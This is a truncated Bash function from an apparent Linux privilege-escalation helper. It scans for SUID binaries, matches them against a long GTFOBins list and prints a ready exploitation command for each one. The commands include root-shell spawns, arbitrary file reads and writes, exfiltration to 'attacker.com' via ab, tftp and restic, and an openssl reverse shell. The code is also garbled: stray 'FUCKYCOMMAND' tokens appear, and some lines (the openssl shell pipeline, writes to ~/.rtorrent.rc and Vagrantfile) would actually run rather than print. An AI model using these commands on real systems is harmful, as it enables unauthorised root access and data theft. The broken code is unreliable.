suidcheck() {
    # List of known GTFO bins
    gtfobins_list=("sudo" "aa-exec" "ab" "agetty" "alpine" "ar" "arj" "arp" "as" "ascii-xfr" "ash" "aspell" "atobm" "awk" "base32" "base64" "basenc" "basez" "bash" "bc" "bridge" "busybox" "bzip2" "cabal" "capsh" "cat" "chmod" "choom" "chown" "chroot" "clamscan" "cmp" "column" "comm" "cp" "cpio" "cpulimit" "csh" "csplit" "csvtool" "cupsfilter" "curl" "cut" "dash" "date" "dd" "debugfs" "dialog" "diff" "dig" "distcc" "dmsetup" "docker" "dosbox" "ed" "efax" "elvish" "emacs" "env" "eqn" "espeak" "expand" "expect" "file" "find" "fish" "flock" "fmt" "fold" "gawk" "gcore" "gdb" "genie" "genisoimage" "gimp" "grep" "gtester" "gzip" "hd" "head" "hexdump" "highlight" "hping3" "iconv" "install" "ionice" "ip" "ispell" "jjs" "join" "jq" "jrunscript" "julia" "ksh" "ksshell" "kubectl" "ld.so" "less" "logsave" "look" "lua" "make" "mawk" "more" "mosquitto" "msgattrib" "msgcat" "msgconv" "msgfilter" "msgmerge" "msguniq" "multitime" "mv" "nasm" "nawk" "ncftp" "nft" "nice" "nl" "nm" "nmap" "node" "nohup" "od" "openssl" "openvpn" "pandoc" "paste" "perf" "perl" "pexec" "pg" "php" "pidstat" "pr" "ptx" "python" "rc" "readelf" "restic" "rev" "rlwrap" "rsync" "rtorrent" "run-parts" "rview" "rvim" "sash" "scanmem" "sed" "setarch" "setfacl" "setlock" "shuf" "soelim" "softlimit" "sort" "sqlite3" "ss" "ssh-agent" "ssh-keygen" "ssh-keyscan" "sshpass" "start-stop-daemon" "stdbuf" "strace" "strings" "sysctl" "systemctl" "tac" "tail" "taskset" "tbl" "tclsh" "tee" "terraform" "tftp" "tic" "time" "timeout" "troff" "ul" "unexpand" "uniq" "unshare" "unsquashfs" "unzip" "update-alternatives" "uudecode" "uuencode" "vagrant" "view" "vigr" "vim" "vimdiff" "vipw" "w3m" "watch" "wc" "wget" "whiptail" "xargs" "xdotool" "xmodmap" "xmore" "xxd" "xz" "yash" "zsh" "zsoelim")

    # Initialize found_flag to 0
    found_flag=0

    # Capture the find command's output into a variable, sort and deduplicate
    found_binaries=$(find / -perm -u=s -type f 2>/dev/null | sort -u)

    # Process the output line-by-line
    echo "$found_binaries" | while read -r full_binary_path; do
        binary=$(basename "$full_binary_path")
        if printf '%s\n' "${gtfobins_list[@]}" | grep -q -w "$binary"; then
            echo "Vulnerable SUID binary found: $full_binary_path"

            # Print the associated commands
            case "$binary" in
                "sudo")
                    echo Associated Command: "$full_binary_path" "this is just a sudo check - nothing to see here (testing)"
                    found_flag=1
                    ;;
                "aa-exec")
                    echo Associated Command: "$full_binary_path" /bin/sh -p
                    found_flag=1
                    ;;
                "ab")
                    echo Associated Command: URL=http://attacker.com/
                    echo LFILE=file_to_send
                    echo "$full_binary_path" -p \$LFILE \$URL
                    found_flag=1
                    ;;
                "agetty")
                    echo Associated Command: "$full_binary_path" -o -p -l /bin/sh -a root tty
                    found_flag=1
                    ;;
                "alpine")
                    echo LFILE=file_to_read
                    echo Associated Command: "$full_binary_path" -F '$LFILE'
                    found_flag=1
                    ;;
                "ar")
                    echo 'TF=$(mktemp -u)'
                    echo LFILE=file_to_read
                    echo "$full_binary_path" r '$TF $LFILE'
                    echo 'cat $TF'
                    found_flag=1
                    ;;
                "arj")
                    echo 'TF=$(mktemp -d)'
                    echo LFILE=file_to_write
                    echo LDIR=where_to_write
                    echo 'echo DATA >$TF/$LFILE'
                    echo "$full_binary_path" 'a $TF/a $TF/$LFILE'
                    echo "$full_binary_path" 'e $TF/a $LDIR'
                    found_flag=1
                    ;;
                "arp")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -v -f '$LFILE'
                    found_flag=1
                    ;;
                "as")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" '@$LFILE'
                    found_flag=1
                    ;;
                "ascii-xfr")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -ns '$LFILE'
                    found_flag=1
                    ;;
                "ash")
                    echo "$full_binary_path"
                    found_flag=1
                    ;;
                "aspell")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -c '$LFILE'
                    found_flag=1
                    ;;
                "atobm")
                    echo LFILE=file_to_read
                    FUCKYCOMMAND echo "$full_binary_path" '$LFILE' 2>&1 | awk -F "'" '{printf "%s", $2}'
                    found_flag=1
                    ;;
                "awk")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" '//' '$LFILE'
                    found_flag=1
                    ;;
                "base32")
                    echo LFILE=file_to_read
                    FUCKYCOMMAND echo "$full_binary_path" '$LFILE' | "$full_binary_path" --decode
                    found_flag=1
                    ;;
                "base64")
                    echo LFILE=file_to_read
                    FUCKYCOMMAND echo "$full_binary_path" '$LFILE' | "$full_binary_path" --decode
                    found_flag=1
                    ;;
                "basenc")
                    echo LFILE=file_to_read
                    FUCKYCOMMAND echo "$full_binary_path" --base64 $LFILE | "$full_binary_path" -d --base64
                    found_flag=1
                    ;;
                "basez")
                    echo LFILE=file_to_read
                    FUCKYCOMMAND echo "$full_binary_path" "$LFILE" | "$full_binary_path" --decode
                    found_flag=1
                    ;;
                "bash")
                    echo "$full_binary_path" -p
                    found_flag=1
                    ;;
                "bc")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -s '$LFILE'
                    echo quit
                    found_flag=1
                    ;;
                "bridge")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -b '$LFILE'
                    found_flag=1
                    ;;
                "busybox")
                    echo "$full_binary_path" sh
                    found_flag=1
                    ;;
                "bzip2")
                    echo LFILE=file_to_read
                    FUCKYCOMMAND echo "$full_binary_path" -c '$LFILE' | "$full_binary_path" -d
                    found_flag=1
                    ;;
                "cabal")
                    echo "$full_binary_path" exec -- /bin/sh -p
                    found_flag=1
                    ;;
                "capsh")
                    echo "$full_binary_path" --gid=0 --uid=0 --
                    found_flag=1
                    ;;
                "cat")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" '$LFILE'
                    found_flag=1
                    ;;
                "chmod")
                    echo LFILE=file_to_change
                    echo "$full_binary_path" 6777 '$LFILE'
                    found_flag=1
                    ;;
                "choom")
                    echo "$full_binary_path" -n 0 -- /bin/sh -p
                    found_flag=1
                    ;;
                "chown")
                    echo LFILE=file_to_change
                    echo "$full_binary_path" $(id -un):$(id -gn) '$LFILE'
                    found_flag=1
                    ;;
                "chroot")
                    echo "$full_binary_path" / /bin/sh -p
                    found_flag=1
                    ;;
                "clamscan")
                    echo LFILE=file_to_read
                    echo TF=$(mktemp -d)
                    echo touch '$TF'/empty.yara
                    FUCKYCOMMAND echo "$full_binary_path" --no-summary -d '$TF' -f '$LFILE' 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'
                    found_flag=1
                    ;;
                "cmp")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" '$LFILE' /dev/zero -b -l
                    found_flag=1
                    ;;
                "column")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" '$LFILE'
                    found_flag=1
                    ;;
                "comm")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" '$LFILE' /dev/null '2>/dev/null'
                    found_flag=1
                    ;;
                "cpio")
                    echo LFILE=file_to_read
                    echo 'TF=$(mktemp -d)'
                    echo "echo \"\$LFILE\" | "$full_binary_path" -R \$UID -dp \$TF"
                    echo cat '$TF/$LFILE'
                    echo 
                    echo OR
                    echo 
                    echo Copies '$LFILE' to the '$LDIR' directory.
                    echo LFILE=file_to_write
                    echo LDIR=where_to_write
                    echo echo 'DATA >$LFILE'
                    echo "echo \"\$LFILE\" | ./cpio -R 0:0 -p \$LDIR"
                    found_flag=1
                    ;;
                "cpulimit")
                    echo "$full_binary_path" -l 100 -f -- /bin/sh -p
                    found_flag=1
                    ;;
                "csh")
                    echo "$full_binary_path" -b
                    found_flag=1
                    ;;
                "csplit")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" $LFILE 1
                    echo cat xx01
                    found_flag=1
                    ;;
                "csvtool")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" trim t '$LFILE'
                    found_flag=1
                    ;;
                "cupsfilter")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -i application/octet-stream -m application/octet-stream '$LFILE'
                    found_flag=1
                    ;;
                "curl")
                    echo Fetch a remote file via HTTP GET request.
                    echo URL=http://attacker.com/file_to_get
                    echo LFILE=file_to_save
                    echo "$full_binary_path" '$URL -o $LFILE'
                    found_flag=1
                    ;;
                "cut")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -d \"\" -f1 '$LFILE'
                    found_flag=1
                    ;;
                "dash")
                    echo "$full_binary_path" -p
                    found_flag=1
                    ;;
                "date")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -f $LFILE
                    found_flag=1
                    ;;
                "dd")
                    echo LFILE=file_to_write
                    FUCKYCOMMAND echo echo "data" | "$full_binary_path" of=$LFILE
                    found_flag=1
                    ;;
                "debugfs")
                    echo "$full_binary_path"
                    echo '!/bin/sh'
                    found_flag=1
                    ;;
                "dialog")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" --textbox '$LFILE' 0 0
                    found_flag=1
                    ;;
                "diff")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" --line-format=%L /dev/null '$LFILE'
                    found_flag=1
                    ;;
                "dig")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -f '$LFILE'
                    found_flag=1
                    ;;
                "distcc")
                    echo "$full_binary_path" /bin/sh -p
                    found_flag=1
                    ;;
                "dmsetup")
                    echo "$full_binary_path" 'create base <<EOF'
                    echo 0 3534848 linear /dev/loop0 94208
                    echo EOF
                    echo "$full_binary_path" ls --exec '/bin/sh -p -s'
                    found_flag=1
                    ;;
                "docker")
                    echo "$full_binary_path" run -v /:/mnt --rm -it alpine chroot /mnt sh
                    found_flag=1
                    ;;
                "dosbox")
                    echo Note that the name of the written file in the following example will be FILE_TO_. Also note that echo terminates the string with a DOS-style line terminator (\r\n), if that’s a problem and your scenario allows it, you can create the file outside dosbox, then use copy to do the actual write.
                    echo LFILE='\path\\to\\file_to_write'
                    echo "$full_binary_path" -c \'mount c /\' -c "echo DATA >c:$LFILE" -c exit
                    found_flag=1
                    ;;
                "ed")
                    echo "$full_binary_path" file_to_read
                    echo ,p
                    echo q
                    found_flag=1
                    ;;
                "efax")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -d '$LFILE'
                    found_flag=1
                    ;;
                "elvish")
                    echo "$full_binary_path"
                    found_flag=1
                    ;;
                "emacs")
                    echo "$full_binary_path" -Q -nw --eval '(term "/bin/sh -p")'
                    found_flag=1
                    ;;
                "env")
                    echo "$full_binary_path" /bin/sh -p
                    found_flag=1
                    ;;
                "eqn")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" '$LFILE'
                    found_flag=1
                    ;;
                "espeak")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -qXf '$LFILE'
                    found_flag=1
                    ;;
                "expand")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" '$LFILE'
                    found_flag=1
                    ;;
                "expect")
                    echo "$full_binary_path" -c 'spawn /bin/sh -p;interact'
                    found_flag=1
                    ;;
                "file")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -f '$LFILE'
                    found_flag=1
                    ;;
                "find")
                    echo "$full_binary_path" . -exec /bin/sh -p \; -quit
                    found_flag=1
                    ;;
                "fish")
                    echo "$full_binary_path"
                    found_flag=1
                    ;;
                "flock")
                    echo "$full_binary_path" -u / /bin/sh -p
                    found_flag=1
                    ;;
                "fmt")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -999 '$LFILE'
                    found_flag=1
                    ;;
                "fold")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -w99999999 '$LFILE'
                    found_flag=1
                    ;;
                "gawk")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" '//' '$LFILE'
                    echo 
                    echo OR
                    echo 
                    echo Limited SUID
                    echo "$full_binary_path" 'BEGIN {system("/bin/sh")}'
                    found_flag=1
                    ;;
                "gcore")
                    echo "$full_binary_path" '$PID'
                    found_flag=1
                    ;;
                "gdb")
                    echo "$full_binary_path" -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
                    found_flag=1
                    ;;
                "genie")
                    echo "$full_binary_path" -c '/bin/sh'
                    found_flag=1
                    ;;
                "genisoimage")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -sort '$LFILE'
                    found_flag=1
                    ;;
                "gimp")
                    echo "$full_binary_path" -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl("/bin/sh", "sh", "-p")'
                    found_flag=1
                    ;;
                "grep")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" '' '$LFILE'
                    found_flag=1
                    ;;
                "gtester")
                    echo TF=$(mktemp)
                    echo echo '#!/bin/sh -p' '> $TF'
                    echo echo 'exec /bin/sh -p 0<&1' '>> $TF'
                    echo chmod +x '$TF'
                    echo sudo "$full_binary_path" '-q $TF'
                    found_flag=1
                    ;;
                "gzip")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -f '$LFILE' -t
                    found_flag=1
                    ;;
                "hd")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" '$LFILE'
                    found_flag=1
                    ;;
                "head")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -c1G '$LFILE'
                    found_flag=1
                    ;;
                "hexdump")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -C '$LFILE'
                    found_flag=1
                    ;;
                "highlight")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" --no-doc --failsafe '$LFILE'
                    found_flag=1
                    ;;
                "hping3")
                    echo "$full_binary_path"
                    echo /bin/sh -p
                    found_flag=1
                    ;;
                "iconv")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -f 8859_1 -t 8859_1 '$LFILE'
                    found_flag=1
                    ;;
                "install")
                    echo LFILE=file_to_change
                    echo 'TF=$(mktemp)'
                    echo "$full_binary_path" -m 6777 '$LFILE $TF'
                    found_flag=1
                    ;;
                "ionice")
                    echo "$full_binary_path" /bin/sh -p
                    found_flag=1
                    ;;
                "ip")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -force -batch '$LFILE'
                    echo 
                    echo "$full_binary_path" netns add foo
                    echo "$full_binary_path" netns exec foo /bin/sh -p
                    echo "$full_binary_path" netns delete foo
                    found_flag=1
                    ;;
                "ispell")
                    echo "$full_binary_path" /etc/passwd
                    echo '!/bin/sh -p'
                    found_flag=1
                    ;;
                "jjs")
                    FUCKYCOMMAND echo echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()" | "$full_binary_path"
                    found_flag=1
                    ;;
                "join")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -a 2 '/dev/null $LFILE'
                    found_flag=1
                    ;;
                "jq")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -Rr . '$LFILE'
                    found_flag=1
                    ;;
                "jrunscript")
                    FUCKYCOMMAND echo "$full_binary_path" -e "exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')"
                    found_flag=1
                    ;;
                "julia")
                    echo "$full_binary_path" -e 'run(`/bin/sh -p`)'
                    found_flag=1
                    ;;
                "ksh")
                    echo "$full_binary_path" -p
                    found_flag=1
                    ;;
                "ksshell")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -i '$LFILE'
                    found_flag=1
                    ;;
                "kubectl")
                    echo LFILE=dir_to_serve
                    echo "$full_binary_path" proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/
                    found_flag=1
                    ;;
                "ld.so")
                    echo "$full_binary_path" /bin/sh -p
                    found_flag=1
                    ;;
                "less")
                    echo "$full_binary_path" file_to_read
                    found_flag=1
                    ;;
                "logsave")
                    echo "$full_binary_path" /dev/null /bin/sh -i -p
                    found_flag=1
                    ;;
                "look")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" '' '$LFILE'
                    found_flag=1
                    ;;
                "lua")
                    echo "$full_binary_path" -e 'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);'
                    found_flag=1
                    ;;
                "make")
                    echo COMMAND='/bin/sh -p'
                    echo "$full_binary_path" -s --eval=$'x:\n\t-''$COMMAND'
                    found_flag=1
                    ;;
                "mawk")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" '//' '$LFILE'
                    found_flag=1
                    ;;
                "more")
                    echo "$full_binary_path" file_to_read
                    found_flag=1
                    ;;
                "mosquitto")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -c '$LFILE'
                    found_flag=1
                    ;;
                "msgattrib")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -P '$LFILE'
                    found_flag=1
                    ;;
                "msgcat")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -P '$LFILE'
                    found_flag=1
                    ;;
                "msgconv")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -P '$LFILE'
                    found_flag=1
                    ;;
                "msgfilter")
                    FUCKYCOMMAND echo echo x | "$full_binary_path" -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'
                    found_flag=1
                    ;;
                "msgmerge")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -P '$LFILE' /dev/null
                    found_flag=1
                    ;;
                "msguniq")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -P '$LFILE'
                    found_flag=1
                    ;;
                "multitime")
                    echo "$full_binary_path" /bin/sh -p
                    found_flag=1
                    ;;
                "mv")
                    echo LFILE=file_to_write
                    echo 'TF=$(mktemp)'
                    echo echo "DATA" '> $TF'
                    echo "$full_binary_path" '$TF $LFILE'
                    found_flag=1
                    ;;
                "nasm")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -@ $LFILE
                    found_flag=1
                    ;;
                "nawk")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" '//' "$LFILE"
                    found_flag=1
                    ;;
                "ncftp")
                    echo "$full_binary_path"
                    echo '!/bin/sh -p'
                    found_flag=1
                    ;;
                "nft")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -f '$LFILE'
                    found_flag=1
                    ;;
                "nice")
                    echo "$full_binary_path" /bin/sh -p
                    found_flag=1
                    ;;
                "nl")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -bn -w1 -s '' '$LFILE'
                    found_flag=1
                    ;;
                "nm")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" '@$LFILE'
                    found_flag=1
                    ;;
                "nmap")
                    echo The payload appears inside the regular nmap output.
                    echo LFILE=file_to_write
                    echo "$full_binary_path" '-oG=$LFILE DATA'
                    found_flag=1
                    ;;
                "node")
                    echo "$full_binary_path" -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})'
                    found_flag=1
                    ;;
                "nohup")
                    echo "$full_binary_path" /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"
                    found_flag=1
                    ;;
                "od")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -An -c -w9999 '$LFILE'
                    found_flag=1
                    ;;
                "openssl")
                    echo To receive the shell run the following on the attacker box:
                    echo 
                    echo "$full_binary_path" req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
                    echo "$full_binary_path" s_server -quiet -key key.pem -cert cert.pem -port 12345
                    echo Communication between attacker and target will be encrypted.
                    echo 
                    echo RHOST=attacker.com
                    echo RPORT=12345
                    FUCKYCOMMAND echo mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | "$full_binary_path" s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
                    echo 
                    echo LFILE=file_to_write
                    FUCKYCOMMAND echo echo DATA | "$full_binary_path" enc -out "$LFILE"
                    found_flag=1
                    ;;
                "openvpn")
                    echo "$full_binary_path" --dev null --script-security 2 --up '/bin/sh -p -c "sh -p"'
                    echo The file is actually parsed and the first partial wrong line is returned in an error message.
                    echo LFILE=file_to_read
                    echo "$full_binary_path" --config '$LFILE'
                    found_flag=1
                    ;;
                "pandoc")
                    echo LFILE=file_to_write
                    FUCKYCOMMAND echo echo DATA | "$full_binary_path" -t plain -o '$LFILE'
                    found_flag=1
                    ;;
                "paste")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" '$LFILE'
                    found_flag=1
                    ;;
                "perf")
                    echo "$full_binary_path" stat /bin/sh -p
                    found_flag=1
                    ;;
                "perl")
                    echo "$full_binary_path" -e 'exec "/bin/sh";'
                    found_flag=1
                    ;;
                "pexec")
                    echo "$full_binary_path" /bin/sh -p
                    found_flag=1
                    ;;
                "pg")
                    echo "$full_binary_path" file_to_read
                    found_flag=1
                    ;;
                "php")
                    echo CMD="/bin/sh"
                    echo "$full_binary_path" -r "pcntl_exec('/bin/sh', ['-p']);"
                    found_flag=1
                    ;;
                "pidstat")
                    echo COMMAND=id
                    echo "$full_binary_path" -e '$COMMAND'
                    found_flag=1
                    ;;
                "pr")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -T '$LFILE'
                    found_flag=1
                    ;;
                "ptx")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -w 5000 '$LFILE'
                    found_flag=1
                    ;;
                "python")
                    echo "$full_binary_path" -c 'import os; os.execl("/bin/sh", "sh", "-p")'
                    found_flag=1
                    ;;
                "rc")
                    echo "$full_binary_path" -c '/bin/sh -p'
                    found_flag=1
                    ;;
                "readelf")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -a '@$LFILE'
                    found_flag=1
                    ;;
                "restic")
                    echo RHOST=attacker.com
                    echo RPORT=12345
                    echo LFILE=file_or_dir_to_get
                    echo NAME=backup_name
                    echo "$full_binary_path" backup -r 'rest:http://$RHOST:$RPORT/$NAME' '$LFILE'
                    found_flag=1
                    ;;
                "rev")
                    echo LFILE=file_to_read
                    FUCKYCOMMAND echo "$full_binary_path" $LFILE | rev
                    found_flag=1
                    ;;
                "rlwrap")
                    echo "$full_binary_path" -H /dev/null /bin/sh -p
                    found_flag=1
                    ;;
                "rsync")
                    echo "$full_binary_path" -e 'sh -p -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
                    found_flag=1
                    ;;
                "rtorrent")
                    FUCKYCOMMAND echo echo "execute = /bin/sh,-p,-c,\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\"" >~/.rtorrent.rc
                    echo "$full_binary_path"
                    found_flag=1
                    ;;
                "run-parts")
                    echo "$full_binary_path" --new-session --regex '^sh$' /bin --arg='-p'
                    found_flag=1
                    ;;
                "rview")
                    echo "$full_binary_path" -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
                    found_flag=1
                    ;;
                "rvim")
                    echo "$full_binary_path" -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
                    found_flag=1
                    ;;
                "sash")
                    echo "$full_binary_path"
                    found_flag=1
                    ;;
                "scanmem")
                    echo "$full_binary_path"
                    echo shell /bin/sh
                    found_flag=1
                    ;;
                "sed")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -e \'\' '$LFILE'
                    found_flag=1
                    ;;
                "setarch")
                    echo "$full_binary_path" '$(arch)' /bin/sh -p
                    found_flag=1
                    ;;
                "setfacl")
                    echo LFILE=file_to_change
                    echo USER=somebody
                    echo "$full_binary_path" '-m u:$USER:rwx $LFILE'
                    found_flag=1
                    ;;
                "setlock")
                    echo "$full_binary_path" - /bin/sh -p
                    found_flag=1
                    ;;
                "shuf")
                    echo LFILE=file_to_write
                    echo "$full_binary_path" -e DATA -o '$LFILE'
                    found_flag=1
                    ;;
                "soelim")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" '$LFILE'
                    found_flag=1
                    ;;
                "softlimit")
                    echo "$full_binary_path" /bin/sh -p
                    found_flag=1
                    ;;
                "sort")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -m '$LFILE'
                    found_flag=1
                    ;;
                "sqlite3")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" '<< EOF'
                    echo 'CREATE TABLE t(line TEXT);'
                    echo '.import '$LFILE' t'
                    echo SELECT * FROM t;
                    echo EOF
                    found_flag=1
                    ;;
                "ss")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -a -F '$LFILE'
                    found_flag=1
                    ;;
                "ssh-agent")
                    echo "$full_binary_path" /bin/ -p
                    found_flag=1
                    ;;
                "ssh-keygen")
                    echo "$full_binary_path" -D ./lib.so
                    found_flag=1
                    ;;
                "ssh-keyscan")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -f '$LFILE'
                    found_flag=1
                    ;;
                "sshpass")
                    echo "$full_binary_path" /bin/sh -p
                    found_flag=1
                    ;;
                "start-stop-daemon")
                    echo "$full_binary_path" -n '$RANDOM' -S -x /bin/sh -- -p
                    found_flag=1
                    ;;
                "stdbuf")
                    echo "$full_binary_path" -i0 /bin/sh -p
                    found_flag=1
                    ;;
                "strace")
                    echo "$full_binary_path" -o /dev/null /bin/sh -p
                    found_flag=1
                    ;;
                "strings")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" '$LFILE'
                    found_flag=1
                    ;;
                "sysctl")
                    echo COMMAND='/bin/sh -c id>/tmp/id'
                    echo "$full_binary_path" 'kernel.core_pattern=|$COMMAND'
                    echo 'sleep 9999 &'
                    echo kill -QUIT $!
                    echo cat /tmp/id
                    found_flag=1
                    ;;
                "systemctl")
                    echo 'TF=$(mktemp).service'
                    echo echo \'[Service]
                    echo Type=oneshot
                    echo 'ExecStart=/bin/sh -c id > /tmp/output'
                    echo [Install]
                    echo 'WantedBy=multi-user.target > $TF'
                    echo "$full_binary_path" link '$TF'
                    echo "$full_binary_path" enable --now '$TF'
                    found_flag=1
                    ;;
                "tac")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -s 'RANDOM' '$LFILE'
                    found_flag=1
                    ;;
                "tail")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -c1G '$LFILE'
                    found_flag=1
                    ;;
                "taskset")
                    echo "$full_binary_path" 1 /bin/sh -p
                    found_flag=1
                    ;;
                "tbl")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" '$LFILE'
                    found_flag=1
                    ;;
                "tclsh")
                    echo "$full_binary_path"
                    echo 'exec /bin/sh -p <@stdin >@stdout 2>@stderr'
                    found_flag=1
                    ;;
                "tee")
                    echo LFILE=file_to_write
                    FUCKYCOMMAND echo echo DATA | "$full_binary_path" -a "$LFILE"
                    found_flag=1
                    ;;
                "terraform")
                    echo "$full_binary_path" console
                    echo 'file("file_to_read")'
                    found_flag=1
                    ;;
                "tftp")
                    echo RHOST=attacker.com
                    echo "$full_binary_path" '$RHOST'
                    echo put file_to_send
                    found_flag=1
                    ;;
                "tic")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -C '$LFILE'
                    found_flag=1
                    ;;
                "time")
                    echo "$full_binary_path" /bin/sh -p
                    found_flag=1
                    ;;
                "timeout")
                    echo "$full_binary_path" 7d /bin/sh -p
                    found_flag=1
                    ;;
                "troff")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" '$LFILE'
                    found_flag=1
                    ;;
                "ul")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" '$LFILE'
                    found_flag=1
                    ;;
                "unexpand")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" -t99999999 '$LFILE'
                    found_flag=1
                    ;;
                "unsquashfs")
                    echo "$full_binary_path" shell
                    echo ./squashfs-root/sh -p
                    found_flag=1
                    ;;
                "unshare")
                    echo "$full_binary_path" -r /bin/sh
                    found_flag=1
                    ;;
                "uniq")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" '$LFILE'
                    found_flag=1
                    ;;
                "unzip")
                    echo "$full_binary_path" -K shell.zip
                    echo ./sh -p
                    found_flag=1
                    ;;
                "update-alternatives")
                    echo LFILE=/path/to/file_to_write
                    echo 'TF=$(mktemp)'
                    echo echo 'DATA >$TF'
                    echo "$full_binary_path" '--force --install "$LFILE" x "$TF" 0'
                    found_flag=1
                    ;;
                "uudecode")
                    echo LFILE=file_to_read
                    FUNKYCOMMAND echo uuencode "$LFILE" /dev/stdout | "$full_binary_path"
                    found_flag=1
                    ;;
                "uuencode")
                    echo LFILE=file_to_read
                    FUNKYCOMMAND echo "$full_binary_path" "$LFILE" /dev/stdout | uudecode
                    found_flag=1
                    ;;
                "vagrant")
                    echo 'cd $(mktemp -d)'
                    echo echo 'exec "/bin/sh -p"' > Vagrantfile
                    echo "$full_binary_path" up
                    found_flag=1
                    ;;
                "view")
                    echo "$full_binary_path" -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
                    found_flag=1
                    ;;
                "vigr")
                    echo "$full_binary_path"
                    found_flag=1
                    ;;
                "vim")
                    echo "$full_binary_path" -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
                    found_flag=1
                    ;;
                "vimdiff")
                    echo "$full_binary_path" -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
                    found_flag=1
                    ;;
                "vipw")
                    echo "$full_binary_path"
                    found_flag=1
                    ;;
                "w3m")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" "$LFILE" -dump
                    found_flag=1
                    ;;
                "watch")
                    echo "$full_binary_path" -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'
                    found_flag=1
                    ;;
                "wc")
                    echo LFILE=file_to_read
                    echo "$full_binary_path" --files0-from "$LFILE"
                    found_flag=1
                    ;;
                "wget")
                    echo TF=$(mktemp)
                    echo chmod +x $TF
